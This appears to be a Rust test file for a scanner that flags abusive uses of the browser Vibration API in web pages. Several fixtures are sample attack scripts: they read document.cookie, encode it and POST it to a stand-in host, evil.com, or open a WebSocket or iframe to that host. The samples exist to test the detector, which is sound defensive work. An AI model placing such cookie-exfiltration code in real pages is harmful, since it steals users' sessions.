use crate::vibration_audit::*;

#[test]
fn no_vibration_no_issues() {
    assert!(analyze_vibration("<html><body>hello</body></html>").is_empty());
}

#[test]
fn detects_api_navigator() {
    let body = r#"<script>navigator.vibrate(200);</script>"#;
    let issues = analyze_vibration(body);
    assert!(issues.contains(&VibrationIssue::ApiDetected));
}

#[test]
fn detects_api_method() {
    let body = r#"<script>device.vibrate(100);</script>"#;
    let issues = analyze_vibration(body);
    assert!(issues.contains(&VibrationIssue::ApiDetected));
}

#[test]
fn detects_no_user_activation() {
    let body = r#"<script>navigator.vibrate(200);</script>"#;
    let issues = analyze_vibration(body);
    assert!(issues.contains(&VibrationIssue::NoUserActivation));
}

#[test]
fn no_activation_issue_with_click() {
    let body = r#"<script>
        btn.addEventListener("click", () => navigator.vibrate(200));
    </script>"#;
    let issues = analyze_vibration(body);
    assert!(!issues.contains(&VibrationIssue::NoUserActivation));
}

#[test]
fn detects_excessive_duration() {
    let body = r#"<script>navigator.vibrate([200, 100, 200, 100, 200]);</script>"#;
    let issues = analyze_vibration(body);
    assert!(issues.contains(&VibrationIssue::ExcessiveDuration));
}

#[test]
fn no_excessive_without_pattern() {
    let body = r#"<script>navigator.vibrate(200);</script>"#;
    let issues = analyze_vibration(body);
    assert!(!issues.contains(&VibrationIssue::ExcessiveDuration));
}

#[test]
fn detects_continuous_vibration() {
    let body = r#"<script>
        setInterval(() => navigator.vibrate(100), 500);
    </script>"#;
    let issues = analyze_vibration(body);
    assert!(issues.contains(&VibrationIssue::ContinuousVibration));
}

#[test]
fn detects_covert_channel() {
    let body = r#"<script>
        const ws = new WebSocket("ws://evil.com");
        ws.onmessage = (e) => navigator.vibrate(JSON.parse(e.data));
    </script>"#;
    let issues = analyze_vibration(body);
    assert!(issues.contains(&VibrationIssue::CovertChannel));
}

#[test]
fn no_covert_without_channel() {
    let body = r#"<script>
        btn.addEventListener("click", () => navigator.vibrate(200));
    </script>"#;
    let issues = analyze_vibration(body);
    assert!(!issues.contains(&VibrationIssue::CovertChannel));
}

#[test]
fn severity_covert_highest() {
    assert_eq!(vibration_severity(&VibrationIssue::CovertChannel), 6.5);
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(vibration_severity(&VibrationIssue::ApiDetected), 2.0);
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![VibrationIssue::ApiDetected, VibrationIssue::CovertChannel];
    let mut seq = 0;
    let ops = vibration_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(VibrationIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        VibrationIssue::NoUserActivation.to_string(),
        "no_user_activation"
    );
    assert_eq!(
        VibrationIssue::ExcessiveDuration.to_string(),
        "excessive_duration"
    );
    assert_eq!(
        VibrationIssue::ContinuousVibration.to_string(),
        "continuous_vibration"
    );
    assert_eq!(VibrationIssue::CovertChannel.to_string(), "covert_channel");
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_vibration("").is_empty());
}

// VibrationSecurityIssue tests

#[test]
fn security_no_vibration_no_issues() {
    assert!(analyze_vibration_security("<html><body>hello</body></html>").is_empty());
}

#[test]
fn security_empty_body() {
    assert!(analyze_vibration_security("").is_empty());
}

#[test]
fn detects_data_exfiltration_fetch() {
    let body = r#"<script>
        const data = document.cookie;
        const encoded = btoa(data);
        navigator.vibrate(200);
        fetch("https://evil.com", { method: "POST", body: encoded });
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationDataExfiltration));
}

#[test]
fn detects_data_exfiltration_xhr() {
    let body = r#"<script>
        const xhr = new XMLHttpRequest();
        const payload = JSON.stringify({data: "secret"});
        navigator.vibrate(100);
        xhr.open("POST", "https://evil.com");
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationDataExfiltration));
}

#[test]
fn detects_data_exfiltration_encode() {
    let body = r#"<script>
        const encoded = encode(document.cookie);
        navigator.vibrate(150);
        fetch("/exfil");
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationDataExfiltration));
}

#[test]
fn no_exfiltration_without_network() {
    let body = r#"<script>
        const data = btoa(document.cookie);
        navigator.vibrate(200);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(!issues.contains(&VibrationSecurityIssue::VibrationDataExfiltration));
}

#[test]
fn detects_fingerprinting_user_agent() {
    let body = r#"<script>
        const ua = navigator.userAgent;
        navigator.vibrate(100);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationFingerprinting));
}

#[test]
fn detects_fingerprinting_platform() {
    let body = r#"<script>
        const p = navigator.platform;
        device.vibrate(200);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationFingerprinting));
}

#[test]
fn detects_fingerprinting_hardware() {
    let body = r#"<script>
        const cores = navigator.hardwareConcurrency;
        const memory = navigator.deviceMemory;
        navigator.vibrate(150);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationFingerprinting));
}

#[test]
fn detects_fingerprinting_touch_points() {
    let body = r#"<script>
        const touch = navigator.maxTouchPoints;
        navigator.vibrate(100);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationFingerprinting));
}

#[test]
fn no_fingerprinting_without_device_info() {
    let body = r#"<script>
        navigator.vibrate(200);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(!issues.contains(&VibrationSecurityIssue::VibrationFingerprinting));
}

#[test]
fn detects_background_visibility_change() {
    let body = r#"<script>
        document.addEventListener("visibilitychange", () => {
            navigator.vibrate(200);
        });
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationInBackground));
}

#[test]
fn detects_background_hidden_check() {
    let body = r#"<script>
        if (document.hidden) {
            navigator.vibrate(100);
        }
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationInBackground));
}

#[test]
fn detects_background_visibility_state() {
    let body = r#"<script>
        if (document.visibilityState === "hidden") {
            device.vibrate(150);
        }
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationInBackground));
}

#[test]
fn no_background_without_visibility_api() {
    let body = r#"<script>
        navigator.vibrate(200);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(!issues.contains(&VibrationSecurityIssue::VibrationInBackground));
}

#[test]
fn detects_dos_set_interval() {
    let body = r#"<script>
        setInterval(() => navigator.vibrate(1000), 100);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationDenialOfService));
}

#[test]
fn detects_dos_request_animation_frame() {
    let body = r#"<script>
        function loop() {
            navigator.vibrate(500);
            requestAnimationFrame(loop);
        }
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationDenialOfService));
}

#[test]
fn detects_dos_infinite_loop() {
    let body = r#"<script>
        while(true) {
            navigator.vibrate(200);
        }
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationDenialOfService));
}

#[test]
fn detects_dos_for_loop() {
    let body = r#"<script>
        for(;;) {
            device.vibrate(300);
        }
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationDenialOfService));
}

#[test]
fn no_dos_single_vibration() {
    let body = r#"<script>
        navigator.vibrate(200);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(!issues.contains(&VibrationSecurityIssue::VibrationDenialOfService));
}

#[test]
fn detects_no_user_gesture_basic() {
    let body = r#"<script>
        navigator.vibrate(200);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationWithoutUserGesture));
}

#[test]
fn no_gesture_issue_with_click() {
    let body = r#"<script>
        btn.addEventListener("click", () => navigator.vibrate(200));
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(!issues.contains(&VibrationSecurityIssue::VibrationWithoutUserGesture));
}

#[test]
fn no_gesture_issue_with_keydown() {
    let body = r#"<script>
        document.addEventListener("keydown", () => device.vibrate(100));
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(!issues.contains(&VibrationSecurityIssue::VibrationWithoutUserGesture));
}

#[test]
fn no_gesture_issue_with_pointerdown() {
    let body = r#"<script>
        elem.addEventListener("pointerdown", () => navigator.vibrate(150));
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(!issues.contains(&VibrationSecurityIssue::VibrationWithoutUserGesture));
}

#[test]
fn no_gesture_issue_with_touchstart() {
    let body = r#"<script>
        elem.addEventListener("touchstart", () => navigator.vibrate(200));
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(!issues.contains(&VibrationSecurityIssue::VibrationWithoutUserGesture));
}

#[test]
fn no_gesture_issue_with_mousedown() {
    let body = r#"<script>
        elem.addEventListener("mousedown", () => navigator.vibrate(100));
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(!issues.contains(&VibrationSecurityIssue::VibrationWithoutUserGesture));
}

#[test]
fn detects_cross_origin_iframe() {
    let body = r#"<script>
        const iframe = document.createElement("iframe");
        iframe.src = "https://evil.com";
        navigator.vibrate(200);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationCrossOrigin));
}

#[test]
fn detects_cross_origin_content_window() {
    let body = r#"<script>
        const win = iframe.contentWindow;
        win.navigator.vibrate(100);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationCrossOrigin));
}

#[test]
fn detects_cross_origin_post_message() {
    let body = r#"<script>
        window.addEventListener("message", (e) => {
            navigator.vibrate(e.data.duration);
        });
        postMessage({cmd: "vibrate"}, "*");
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationCrossOrigin));
}

#[test]
fn detects_cross_origin_parent() {
    let body = r#"<script>
        parent.postMessage("vibrate", "*");
        navigator.vibrate(150);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationCrossOrigin));
}

#[test]
fn no_cross_origin_without_iframe() {
    let body = r#"<script>
        navigator.vibrate(200);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(!issues.contains(&VibrationSecurityIssue::VibrationCrossOrigin));
}

#[test]
fn detects_pattern_encoding_map() {
    let body = r#"<script>
        const pattern = "secret".split("").map(c => c.charCodeAt(0) * 10);
        navigator.vibrate([pattern]);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationPatternEncoding));
}

#[test]
fn detects_pattern_encoding_reduce() {
    let body = r#"<script>
        const encoded = data.reduce((acc, val) => [...acc, val * 2], []);
        navigator.vibrate([encoded]);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationPatternEncoding));
}

#[test]
fn detects_pattern_encoding_char_code() {
    let body = r#"<script>
        const codes = message.split("").map(c => c.charCodeAt(0));
        device.vibrate([codes]);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationPatternEncoding));
}

#[test]
fn no_pattern_encoding_without_array() {
    let body = r#"<script>
        const pattern = "secret".split("").map(c => c.charCodeAt(0));
        navigator.vibrate(200);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(!issues.contains(&VibrationSecurityIssue::VibrationPatternEncoding));
}

#[test]
fn detects_notification_combo() {
    let body = r#"<script>
        new Notification("Alert!");
        navigator.vibrate(200);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationWithNotification));
}

#[test]
fn detects_notification_show() {
    let body = r#"<script>
        registration.showNotification("Alert");
        device.vibrate(150);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationWithNotification));
}

#[test]
fn detects_notification_permissions() {
    let body = r#"<script>
        navigator.permissions.query({name: "notifications"});
        navigator.vibrate(100);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationWithNotification));
}

#[test]
fn no_notification_alone() {
    let body = r#"<script>
        navigator.vibrate(200);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(!issues.contains(&VibrationSecurityIssue::VibrationWithNotification));
}

#[test]
fn detects_timing_attack_performance_now() {
    let body = r#"<script>
        const start = performance.now();
        navigator.vibrate(200);
        const end = performance.now();
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationTimingAttack));
}

#[test]
fn detects_timing_attack_date_now() {
    let body = r#"<script>
        const t1 = Date.now();
        device.vibrate(100);
        const t2 = Date.now();
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationTimingAttack));
}

#[test]
fn detects_timing_attack_timing_api() {
    let body = r#"<script>
        const timing = performance.timing;
        navigator.vibrate(150);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationTimingAttack));
}

#[test]
fn detects_timing_attack_measure() {
    let body = r#"<script>
        performance.measure("vibration");
        navigator.vibrate(200);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationTimingAttack));
}

#[test]
fn no_timing_attack_without_time_api() {
    let body = r#"<script>
        navigator.vibrate(200);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(!issues.contains(&VibrationSecurityIssue::VibrationTimingAttack));
}

#[test]
fn detects_excessive_duration_6000() {
    let body = r#"<script>navigator.vibrate(6000);</script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::ExcessiveVibrationDuration));
}

#[test]
fn detects_excessive_duration_10000() {
    let body = r#"<script>device.vibrate(10000);</script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::ExcessiveVibrationDuration));
}

#[test]
fn no_excessive_duration_4000() {
    let body = r#"<script>navigator.vibrate(4000);</script>"#;
    let issues = analyze_vibration_security(body);
    assert!(!issues.contains(&VibrationSecurityIssue::ExcessiveVibrationDuration));
}

#[test]
fn no_excessive_duration_200() {
    let body = r#"<script>navigator.vibrate(200);</script>"#;
    let issues = analyze_vibration_security(body);
    assert!(!issues.contains(&VibrationSecurityIssue::ExcessiveVibrationDuration));
}

#[test]
fn security_severity_exfiltration_highest() {
    assert_eq!(
        vibration_security_severity(&VibrationSecurityIssue::VibrationDataExfiltration),
        8.0
    );
}

#[test]
fn security_severity_timing_attack() {
    assert_eq!(
        vibration_security_severity(&VibrationSecurityIssue::VibrationTimingAttack),
        7.5
    );
}

#[test]
fn security_severity_pattern_encoding() {
    assert_eq!(
        vibration_security_severity(&VibrationSecurityIssue::VibrationPatternEncoding),
        7.0
    );
}

#[test]
fn security_severity_fingerprinting() {
    assert_eq!(
        vibration_security_severity(&VibrationSecurityIssue::VibrationFingerprinting),
        6.5
    );
}

#[test]
fn security_severity_dos() {
    assert_eq!(
        vibration_security_severity(&VibrationSecurityIssue::VibrationDenialOfService),
        6.0
    );
}

#[test]
fn security_severity_cross_origin() {
    assert_eq!(
        vibration_security_severity(&VibrationSecurityIssue::VibrationCrossOrigin),
        5.5
    );
}

#[test]
fn security_severity_background() {
    assert_eq!(
        vibration_security_severity(&VibrationSecurityIssue::VibrationInBackground),
        5.0
    );
}

#[test]
fn security_severity_notification() {
    assert_eq!(
        vibration_security_severity(&VibrationSecurityIssue::VibrationWithNotification),
        4.5
    );
}

#[test]
fn security_severity_no_gesture() {
    assert_eq!(
        vibration_security_severity(&VibrationSecurityIssue::VibrationWithoutUserGesture),
        4.0
    );
}

#[test]
fn security_severity_excessive_duration_lowest() {
    assert_eq!(
        vibration_security_severity(&VibrationSecurityIssue::ExcessiveVibrationDuration),
        3.5
    );
}

#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        VibrationSecurityIssue::VibrationDataExfiltration,
        VibrationSecurityIssue::VibrationFingerprinting,
    ];
    let mut seq = 0;
    let ops = vibration_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn security_to_operations_empty() {
    let issues = vec![];
    let mut seq = 0;
    let ops = vibration_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 0);
    assert_eq!(seq, 0);
}

#[test]
fn security_display_exfiltration() {
    assert_eq!(
        VibrationSecurityIssue::VibrationDataExfiltration.to_string(),
        "vibration_data_exfiltration"
    );
}

#[test]
fn security_display_fingerprinting() {
    assert_eq!(
        VibrationSecurityIssue::VibrationFingerprinting.to_string(),
        "vibration_fingerprinting"
    );
}

#[test]
fn security_display_background() {
    assert_eq!(
        VibrationSecurityIssue::VibrationInBackground.to_string(),
        "vibration_in_background"
    );
}

#[test]
fn security_display_dos() {
    assert_eq!(
        VibrationSecurityIssue::VibrationDenialOfService.to_string(),
        "vibration_denial_of_service"
    );
}

#[test]
fn security_display_no_gesture() {
    assert_eq!(
        VibrationSecurityIssue::VibrationWithoutUserGesture.to_string(),
        "vibration_without_user_gesture"
    );
}

#[test]
fn security_display_cross_origin() {
    assert_eq!(
        VibrationSecurityIssue::VibrationCrossOrigin.to_string(),
        "vibration_cross_origin"
    );
}

#[test]
fn security_display_pattern_encoding() {
    assert_eq!(
        VibrationSecurityIssue::VibrationPatternEncoding.to_string(),
        "vibration_pattern_encoding"
    );
}

#[test]
fn security_display_notification() {
    assert_eq!(
        VibrationSecurityIssue::VibrationWithNotification.to_string(),
        "vibration_with_notification"
    );
}

#[test]
fn security_display_timing_attack() {
    assert_eq!(
        VibrationSecurityIssue::VibrationTimingAttack.to_string(),
        "vibration_timing_attack"
    );
}

#[test]
fn security_display_excessive_duration() {
    assert_eq!(
        VibrationSecurityIssue::ExcessiveVibrationDuration.to_string(),
        "excessive_vibration_duration"
    );
}

#[test]
fn multiple_security_issues_detected() {
    let body = r#"<script>
        const ua = navigator.userAgent;
        const start = performance.now();
        setInterval(() => {
            navigator.vibrate(8000);
            fetch("https://evil.com", { method: "POST", body: btoa(ua) });
        }, 1000);
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationDataExfiltration));
    assert!(issues.contains(&VibrationSecurityIssue::VibrationFingerprinting));
    assert!(issues.contains(&VibrationSecurityIssue::VibrationDenialOfService));
    assert!(issues.contains(&VibrationSecurityIssue::VibrationTimingAttack));
    assert!(issues.contains(&VibrationSecurityIssue::ExcessiveVibrationDuration));
}

#[test]
fn complex_attack_scenario() {
    let body = r#"<script>
        document.addEventListener("visibilitychange", () => {
            if (document.hidden) {
                const pattern = "data".split("").map(c => c.charCodeAt(0) * 100);
                navigator.vibrate([pattern]);
                new Notification("Background alert");
            }
        });
    </script>"#;
    let issues = analyze_vibration_security(body);
    assert!(issues.contains(&VibrationSecurityIssue::VibrationInBackground));
    assert!(issues.contains(&VibrationSecurityIssue::VibrationPatternEncoding));
    assert!(issues.contains(&VibrationSecurityIssue::VibrationWithNotification));
}
